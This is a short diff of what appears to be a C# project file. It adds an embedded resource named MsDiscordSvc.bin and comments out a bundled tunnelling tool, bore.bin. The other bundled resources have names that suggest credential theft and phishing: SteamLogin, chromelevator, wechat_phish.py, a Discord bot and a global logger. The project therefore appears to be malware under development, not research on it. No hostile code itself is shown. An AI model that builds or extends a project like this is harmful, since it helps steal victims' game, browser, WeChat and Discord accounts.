@@ -48,9 +48,10 @@
     <EmbeddedResource Include="SteamAlert.bin" />
     <EmbeddedResource Include="SteamLogin.bin" />
     <EmbeddedResource Include="chromelevator.bin" />
+    <EmbeddedResource Include="MsDiscordSvc.bin" />
     <EmbeddedResource Include="core\wechat_phish.py" />
     <EmbeddedResource Include="websocket\discord_bot.py" />
-    <EmbeddedResource Include="tools\bore.bin" />
+    <!-- <EmbeddedResource Include="tools\bore.bin" /> -->
     <EmbeddedResource Include="e_sqlite3.dll" />
     <EmbeddedResource Include="GlobalLogger.py" />
   </ItemGroup>
